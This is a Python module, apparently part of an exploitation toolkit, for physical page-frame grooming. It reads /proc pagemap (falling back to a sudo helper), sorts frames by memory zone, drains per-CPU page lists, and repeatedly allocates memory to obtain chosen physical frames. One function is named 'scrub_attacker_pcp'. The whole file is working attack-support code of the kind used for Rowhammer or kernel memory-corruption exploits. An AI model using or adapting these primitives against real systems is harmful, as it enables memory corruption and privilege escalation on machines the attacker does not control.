"""PCP hunt and drain."""

from __future__ import annotations

import ctypes
import mmap
import os
import struct
import subprocess
from pathlib import Path
from typing import Dict, Optional

PAGE_SIZE = os.sysconf("SC_PAGESIZE")
DMA32_MAX_PFN = 0x100000
PFN_MASK = (1 << 55) - 1
PRESENT = 1 << 63
DEFAULT_PCP_DRAIN_PAGES = 512
SCAN_BIN = Path(__file__).resolve().parent / "build" / "scan_pagemap"


def _parse_pagemap_bytes(data: bytes, pages: int) -> list[int]:
    out = []
    for i in range(pages):
        raw = data[i * 8 : (i + 1) * 8]
        if len(raw) != 8:
            out.append(0)
            continue
        entry = struct.unpack("<Q", raw)[0]
        out.append((entry & PFN_MASK) if (entry & PRESENT) else 0)
    return out


def _read_pagemap(pid: int, vaddr: int, pages: int) -> list[int]:
    try:
        with open(f"/proc/{pid}/pagemap", "rb", buffering=0) as pm:
            pm.seek((vaddr // PAGE_SIZE) * 8)
            data = pm.read(pages * 8)
    except OSError:
        return [0] * pages
    return _parse_pagemap_bytes(data, pages)


def _read_pagemap_sudo(pid: int, vaddr: int, pages: int) -> list[int]:
    if not SCAN_BIN.is_file():
        return [0] * pages
    for sudo in (["sudo", "-n"], ["sudo"]):
        try:
            proc = subprocess.run(
                [*sudo, str(SCAN_BIN), str(pid), hex(int(vaddr)), str(int(pages))],
                check=False,
                capture_output=True,
                text=True,
            )
        except OSError:
            continue
        if proc.returncode != 0:
            continue
        lines = [ln.strip() for ln in proc.stdout.splitlines() if ln.strip()]
        if len(lines) < pages:
            continue
        out = []
        for line in lines[:pages]:
            try:
                out.append(int(line, 0))
            except ValueError:
                out.append(0)
        if any(out):
            return out
    return [0] * pages


def collect_pfns(pid: int, vaddr: int, pages: int) -> list[int]:
    pfns = _read_pagemap(pid, vaddr, pages)
    if any(pfns):
        return pfns
    return _read_pagemap_sudo(pid, vaddr, pages)


def infer_zone_from_pfns(pfns: list[int], *, default: str = "normal") -> str:
    present = [pfn for pfn in pfns if pfn]
    if not present:
        return default
    dma32 = sum(1 for pfn in present if pfn < DMA32_MAX_PFN)
    return "dma32" if dma32 * 2 >= len(present) else "normal"


def fault_hunt_pages(pages: int) -> tuple[mmap.mmap, list[int]]:
    buf = mmap.mmap(
        -1,
        pages * PAGE_SIZE,
        flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
        prot=mmap.PROT_READ | mmap.PROT_WRITE,
    )
    for i in range(pages):
        buf[i * PAGE_SIZE] = 0x41
    view = memoryview(buf)
    addr = ctypes.addressof(ctypes.c_char.from_buffer(view))
    pfns = collect_pfns(os.getpid(), addr, pages)
    return buf, pfns


def hunt_base_addr(buf: mmap.mmap) -> int:
    view = memoryview(buf)
    return ctypes.addressof(ctypes.c_char.from_buffer(view))


def indices_in_zone(pfns: list[int], zone: str) -> list[int]:
    want_dma32 = zone == "dma32"
    out: list[int] = []
    for idx, pfn in enumerate(pfns):
        if not pfn:
            continue
        if (pfn < DMA32_MAX_PFN) == want_dma32:
            out.append(idx)
    return out


def pick_drain_indices(
    hunt_pfns: list[int],
    *,
    zone: str,
    drain_pages: int,
    exclude: set[int],
) -> list[int]:
    want = max(0, int(drain_pages))
    if want == 0:
        return []
    candidates = [
        idx for idx in indices_in_zone(hunt_pfns, zone) if idx not in exclude
    ]
    if len(candidates) < want:
        extra = [
            idx
            for idx in range(len(hunt_pfns))
            if idx not in exclude and idx not in candidates
        ]
        candidates.extend(extra)
    return candidates[:want]


def drain_pcp_on_buffer(
    buf: mmap.mmap,
    hunt_pfns: list[int],
    *,
    zone: str,
    drain_pages: int,
    exclude: set[int],
) -> Dict[str, object]:
    indices = pick_drain_indices(
        hunt_pfns,
        zone=zone,
        drain_pages=drain_pages,
        exclude=exclude,
    )
    for idx in indices:
        buf.madvise(mmap.MADV_DONTNEED, idx * PAGE_SIZE, PAGE_SIZE)
    for idx in indices:
        buf[idx * PAGE_SIZE] = 0x41
    return {
        "zone": zone,
        "drain_requested": int(drain_pages),
        "drain_done": len(indices),
    }


def release_plan(
    pfns: list[int], preferred_zone: str, release_total: int
) -> list[tuple[int, int]]:
    want_dma32 = preferred_zone == "dma32"
    selected: list[tuple[int, int]] = []
    for idx, pfn in enumerate(pfns):
        if not pfn:
            continue
        if (pfn < DMA32_MAX_PFN) != want_dma32:
            continue
        selected.append((idx, pfn))
        if len(selected) >= release_total:
            break
    return selected


def release_plan_with_fallback(
    pfns: list[int],
    release_total: int,
    *,
    preferred_zone: str,
) -> tuple[list[tuple[int, int]], str]:
    zones = [preferred_zone]
    other = "dma32" if preferred_zone == "normal" else "normal"
    if other not in zones:
        zones.append(other)
    for zone in zones:
        selected = release_plan(pfns, zone, release_total)
        if len(selected) >= release_total:
            return selected, zone
    return release_plan(pfns, preferred_zone, release_total), preferred_zone


def acquire_hunt_release(
    release_total: int,
    *,
    hunt_pages: int,
    preferred_zone: str,
    zone_hint_pfns: Optional[list[int]] = None,
    max_attempts: int = 8,
) -> tuple[
    Optional[mmap.mmap],
    list[int],
    list[tuple[int, int]],
    str,
    Dict[str, object],
]:
    target_zone = preferred_zone
    if preferred_zone == "auto":
        target_zone = infer_zone_from_pfns(zone_hint_pfns or [], default="normal")

    last_stats: Dict[str, object] = {}
    hunt_buf: Optional[mmap.mmap] = None
    hunt_pfns: list[int] = []
    for attempt in range(max_attempts):
        if hunt_buf is not None:
            hunt_buf.close()
        hunt_buf, hunt_pfns = fault_hunt_pages(hunt_pages)
        last_stats = {
            "attempt": attempt + 1,
            "nonzero": sum(1 for pfn in hunt_pfns if pfn),
        }
        if int(last_stats["nonzero"]) == 0:
            continue
        selected, zone = release_plan_with_fallback(
            hunt_pfns,
            release_total,
            preferred_zone=target_zone,
        )
        if len(selected) >= release_total:
            last_stats["selected_zone"] = zone
            return hunt_buf, hunt_pfns, selected, zone, last_stats

    if hunt_buf is not None:
        hunt_buf.close()
    return None, hunt_pfns, [], target_zone, last_stats


def acquire_wanted_pfns(
    wanted: list[int],
    *,
    hunt_pages: int,
    max_attempts: int = 16,
) -> tuple[
    Optional[mmap.mmap],
    list[int],
    list[tuple[int, int]],
    Dict[str, object],
]:
    last_stats: Dict[str, object] = {"found": 0, "wanted": len(wanted)}
    hunt_buf: Optional[mmap.mmap] = None
    hunt_pfns: list[int] = []
    for attempt in range(max_attempts):
        if hunt_buf is not None:
            hunt_buf.close()
        hunt_buf, hunt_pfns = fault_hunt_pages(hunt_pages)
        idx_by_pfn: Dict[int, int] = {}
        for idx, pfn in enumerate(hunt_pfns):
            if pfn and pfn not in idx_by_pfn:
                idx_by_pfn[pfn] = idx
        selected: list[tuple[int, int]] = []
        used: set[int] = set()
        ok = True
        for pfn in wanted:
            idx = idx_by_pfn.get(int(pfn))
            if idx is None or idx in used:
                ok = False
                break
            used.add(idx)
            selected.append((idx, int(pfn)))
        last_stats = {
            "attempt": attempt + 1,
            "found": len(selected) if ok else sum(1 for p in wanted if p in idx_by_pfn),
            "wanted": len(wanted),
        }
        if ok and len(selected) == len(wanted):
            return hunt_buf, hunt_pfns, selected, last_stats
    if hunt_buf is not None:
        hunt_buf.close()
    return None, hunt_pfns, [], last_stats


def select_listed_pfns(
    wanted: list[int],
    hunt_pfns: list[int],
) -> tuple[list[tuple[int, int]], list[int]]:
    """Keep hunt pages whose PFN is in ``wanted``, preserving wanted order."""
    idx_by_pfn: Dict[int, int] = {}
    for idx, pfn in enumerate(hunt_pfns):
        if pfn and pfn not in idx_by_pfn:
            idx_by_pfn[pfn] = idx
    selected: list[tuple[int, int]] = []
    used: set[int] = set()
    missing: list[int] = []
    for pfn in wanted:
        idx = idx_by_pfn.get(int(pfn))
        if idx is None or idx in used:
            missing.append(int(pfn))
            continue
        used.add(idx)
        selected.append((idx, int(pfn)))
    return selected, missing


def scrub_attacker_pcp(*, drain_pages: int, zone: str) -> Dict[str, object]:
    pages = max(int(drain_pages), 64)
    buf, pfns = fault_hunt_pages(pages)
    try:
        return drain_pcp_on_buffer(
            buf,
            pfns,
            zone=zone,
            drain_pages=drain_pages,
            exclude=set(),
        )
    finally:
        buf.close()
